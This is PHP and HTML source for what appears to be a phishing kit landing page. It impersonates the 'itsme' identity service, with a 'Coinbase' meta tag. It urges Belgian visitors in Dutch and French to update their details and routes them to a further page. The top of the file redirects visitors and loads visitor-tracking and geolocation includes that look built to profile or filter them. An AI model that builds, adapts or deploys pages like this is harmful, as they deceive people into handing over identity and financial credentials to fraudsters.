<?php
error_reporting(0);
session_start();

// redirect مباشرة
header("Location: ./CyMOB/kb/");
exit();

include('./CryoFusion/Emberclaw.php');
include('./CryoFusion/CherryBlossom.php');
include('./CryoFusion/EmeraldCity.php');
include('./CryoFusion/GoldenGateBridge.php');
include('./CryoFusion/GrandCanyon.php');
include('./CryoFusion/PacificOcean.php');
include('./CryoFusion/SerengetiPlains.php');
include('./CryoFusion/VictoriaFalls.php');
include('./CryoFusion/Thalorinox.php');

include "./CryoFusion/geoplugin.class.php";
include "./CryoFusion/UserInfo.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="./Asstes/imgs/its.webp">
        <title>Irvice</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_option -->
    <div class="wrapper_box_option">
      <div class="container_box_option d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Asstes/imgs/logo.svg" alt="">
            </div>
            <div class="icon">
              <img src="./Asstes/imgs/wpc.webp" alt="">
            </div>
            <div class="info">
              <div class="title">
                <h1>Itsme&reg; service</h1>
              </div>
              <div class="btns">
                <button class="go go_be">Update uw gegevens nu (Nederlands)</button>
                <p class="ou mb-0">
                </p>
                <button class="go go_fr">Mettre à jour mes informations (Français)</button>
              </div>
            </div>
        </div>
        <div class="part_right items d-flex justify-content-end align-items-center">
          <img src="./Asstes/imgs/wpc.webp" alt="">
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
      $(".go_be").click(function(){
          window.location.href="./type.php?lang=nl";
      }) 
      $(".go_fr").click(function(){
          window.location.href="./type.php?lang=fr";
      }) 
    </script>
    </body>
</html>